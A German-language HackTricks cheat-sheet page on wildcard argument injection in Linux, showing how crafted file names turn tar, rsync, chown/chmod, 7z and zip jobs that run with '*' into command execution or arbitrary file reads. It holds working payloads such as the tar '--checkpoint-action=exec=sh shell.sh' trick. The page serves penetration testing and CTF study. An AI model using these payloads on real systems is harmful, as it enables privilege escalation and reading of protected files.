<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>


## chown, chmod

Sie können **angeben, welchen Dateibesitzer und welche Berechtigungen Sie für den Rest der Dateien kopieren möchten**.
```bash
touch "--reference=/my/own/path/filename"
```
Sie können dies mit [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(kombinierter Angriff)_ ausnutzen. Weitere Informationen finden Sie unter [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**Beliebige Befehle ausführen:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Sie können dies mit [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar attack)_ ausnutzen. Weitere Informationen finden Sie unter [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**Beliebige Befehle ausführen:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
Sie können dies mit [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) ausnutzen (_rsync-Angriff_)\
Weitere Informationen finden Sie unter [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

In **7z** können Sie sogar mit `--` vor `*` (beachten Sie, dass `--` bedeutet, dass die folgende Eingabe nicht als Parameter behandelt werden kann, sondern nur als Dateipfade in diesem Fall) einen beliebigen Fehler verursachen, um eine Datei zu lesen. Wenn also ein Befehl wie der folgende von root ausgeführt wird:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
Und Sie können Dateien im Ordner erstellen, in dem dies ausgeführt wird. Sie könnten die Datei `@root.txt` und die Datei `root.txt` erstellen, wobei `root.txt` ein **Symbolischer Link** auf die Datei ist, die Sie lesen möchten:
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
Dann, wenn **7z** ausgeführt wird, behandelt es `root.txt` als eine Datei, die die Liste der Dateien enthält, die es komprimieren soll (das zeigt die Existenz von `@root.txt` an) und wenn 7z `root.txt` liest, liest es `/file/you/want/to/read` und **da der Inhalt dieser Datei keine Liste von Dateien ist, wird ein Fehler angezeigt** und der Inhalt wird angezeigt.

_Weitere Informationen finden Sie in den Write-ups der Box CTF von HackTheBox._

## Zip

**Beliebige Befehle ausführen:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
